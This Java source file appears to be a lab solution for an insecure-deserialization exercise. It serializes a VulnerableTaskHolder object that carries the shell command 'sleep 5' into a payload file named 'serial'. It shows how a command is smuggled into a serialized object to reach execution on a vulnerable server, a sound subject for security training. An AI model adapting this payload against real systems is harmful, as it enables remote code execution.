package org.dummy.insecure.framework;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class Attack {
   public static void main(String args[]) throws Exception{

       VulnerableTaskHolder vulnObj = new VulnerableTaskHolder("dummy", "sleep 5");
       FileOutputStream fos = new FileOutputStream("serial");
       ObjectOutputStream os = new ObjectOutputStream(fos);
       os.writeObject(vulnObj);
       os.close();

   }
}